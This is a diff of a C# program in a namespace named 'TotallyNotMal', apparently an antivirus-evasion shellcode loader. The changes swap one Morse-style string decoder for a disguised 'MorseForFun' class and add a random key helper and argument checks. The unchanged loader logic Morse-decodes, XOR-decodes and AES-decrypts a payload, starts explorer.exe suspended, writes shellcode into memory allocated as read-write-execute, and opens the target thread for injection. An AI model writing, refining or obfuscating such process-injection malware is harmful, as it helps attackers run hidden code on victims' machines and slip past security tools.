@@ -136,6 +136,40 @@ namespace TotallyNotMal
             IntPtr hStdErr;
         }
 
+        public class MorseForFun
+        {
+            private static Dictionary<char, string> _morseAlphabetDictionary;
+
+            public static void InitializeDictionary()
+            {
+                _morseAlphabetDictionary = new Dictionary<char, string>()
+                                   {
+{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
+                                   };
+            }
+
+            public static string Receive(string input)
+            {
+                StringBuilder stringBuilder = new StringBuilder();
+
+                string[] codes = input.Split(' ');
+
+                foreach (var code in codes)
+                {
+                    foreach (char keyVar in _morseAlphabetDictionary.Keys)
+                    {
+                        if (_morseAlphabetDictionary[keyVar] == code)
+                        {
+                            stringBuilder.Append(keyVar);
+                            break;
+                        }
+                    }
+                }
+
+                return stringBuilder.ToString();
+            }
+        }
+
         public static PROCESS_INFORMATION StartProcess(string binaryPath)
         {
             uint flags = 0x00000004;
@@ -145,6 +179,14 @@ namespace TotallyNotMal
             CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);
 
             return procInfo;
+        }
+
+        private static Random random = new Random();
+        public static string RandomKey(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+            return new string(Enumerable.Repeat(chars, length)
+              .Select(s => s[random.Next(s.Length)]).ToArray());
         }
 
         private static byte[] xorEncDec(byte[] input, string theKeystring)
@@ -161,6 +203,13 @@ namespace TotallyNotMal
         //https://raw.githubusercontent.com/smokeme/payloadGenerator/main/xor/template
         public static string DecryptStringFromBytes(byte[] cipherText, byte[] rawKey, byte[] rawIV)
         {
+            // Check arguments.
+            if (cipherText == null || cipherText.Length <= 0)
+                throw new ArgumentNullException("cipherText");
+            if (rawKey == null || rawKey.Length <= 0)
+                throw new ArgumentNullException("Key");
+            if (rawIV == null || rawIV.Length <= 0)
+                throw new ArgumentNullException("Key");
 
             // Declare the string used to hold
             // the decrypted text.
@@ -220,29 +269,6 @@ namespace TotallyNotMal
             return decryptedData;
         }
 
-        public static string rahsia(string encoded)
-        {
-            char[] text = { 'a', 'A', 'b', 'B', 'c', 'C', 'd', 'D', 'e', 'E', 'f', 'F', 'g', 'G', 'h', 'H', 'i', 'I', 'j', 'J', 'k', 'K', 'l', 'L', 'm', 'M', 'n', 'N', 'o', 'O', 'p', 'P', 'q', 'Q', 'r', 'R', 's', 'S', 't', 'T', 'u', 'U', 'v', 'V', 'w', 'W', 'x', 'X', 'y', 'Y', 'z', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '/', '=', '+', '!' };
-            string[] titik = { ".-", "^.-", "-...", "^-...", "-.-.", "^-.-.", "-..", "^-..", ".", "^.", "..-.", "^..-.", "--.", "^--.", "....", "^....", "..", "^..", ".---", "^.---", "-.-", "^-.-", ".-..", "^.-..", "--", "^--", "-.", "^-.", "---", "^---", ".--.", "^.--.", "--.-", "^--.-", ".-.", "^.-.", "...", "^...", "-", "^-", "..-", "^..-", "...-", "^...-", ".--", "^.--", "-..-", "^-..-", "-.--", "^-.--", "--..", "^--..", "-----", ".----", "..---", "...--", "....-", ".....", "-....", "--...", "---..", "----.", "/", "...^-", "^.^", "^..^" };
-            string[] codes = encoded.Split(' ');
-
-            StringBuilder decoded = new StringBuilder();
-
-            for (int i = 0; i < codes.Length; i++)
-            {
-
-                for (int k = 0; k < titik.Length; k++)
-                {
-                    if (codes[i].Equals(titik[k]))
-                    {
-                        decoded.Append(text[k]);
-                    }
-                }
-
-            }
-            return decoded.ToString();
-        }
-
         public static void Main()
         {
 
@@ -253,10 +279,12 @@ namespace TotallyNotMal
 
             byte[] sh3Llc0d3 = new byte[] { };
 
-            xoredAesB64 = rahsia(xoredAesB64);
-            aE5k3y = rahsia(aE5k3y);
-            aE5Iv = rahsia(aE5Iv);
-            xorKey = rahsia(xorKey);
+            MorseForFun.InitializeDictionary();
+
+            xoredAesB64 = MorseForFun.Receive(xoredAesB64);
+            aE5k3y = MorseForFun.Receive(aE5k3y);
+            aE5Iv = MorseForFun.Receive(aE5Iv);
+            xorKey = MorseForFun.Receive(xorKey);
 
             byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xoredAesB64), xorKey);
 
@@ -277,14 +305,12 @@ namespace TotallyNotMal
             uint lpNumberOfBytesWritten = 0;
 
             PROCESS_INFORMATION processInfo = StartProcess("C:/Windows/explorer.exe");
-            //use this if you prefer not to spawn new process
-            //PROCESS_INFORMATION processInfo = Process.GetProcessesByName("explorer")[0];
 
             IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)processInfo.dwProcessId);
 
             IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)sh3Llc0d3.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
 
-            if(WriteProcessMemory(pHandle, rMemAddress, sh3Llc0d3, (uint)sh3Llc0d3.Length, ref lpNumberOfBytesWritten))
+            if (WriteProcessMemory(pHandle, rMemAddress, sh3Llc0d3, (uint)sh3Llc0d3.Length, ref lpNumberOfBytesWritten))
             {
 
                 IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)processInfo.dwThreadId);
